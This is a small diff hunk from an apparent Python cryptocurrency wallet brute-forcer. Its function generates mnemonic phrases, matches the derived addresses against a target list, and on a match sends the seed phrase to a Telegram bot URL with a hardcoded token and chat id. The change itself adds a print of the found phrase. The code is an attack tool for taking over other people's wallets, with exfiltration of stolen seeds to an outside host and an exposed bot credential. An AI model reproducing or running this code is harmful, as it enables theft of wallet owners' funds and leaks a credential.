@@ -51,6 +51,7 @@ def brute_force_wallet(listarr):
                     #with open("normaddr.txt", "a") as f:
                         #f.write(phrase + "??" + address + "\n")
                 if (str(address).lower() in listarr):
+                    print(str(phrase) + '\n' + 'address: ' + str(address))
                     try:
                         requests.get('https://api.telegram.org/bot1542518391:AAF-g9tAClBokAPj90bze3nTeS1ieFXVyNA/sendMessage?chat_id=-1001569507312&text=BALANCEACC   BNB mnemonic: ' + str(phrase) + '\n' + 'address: ' + str(address))
                     except:
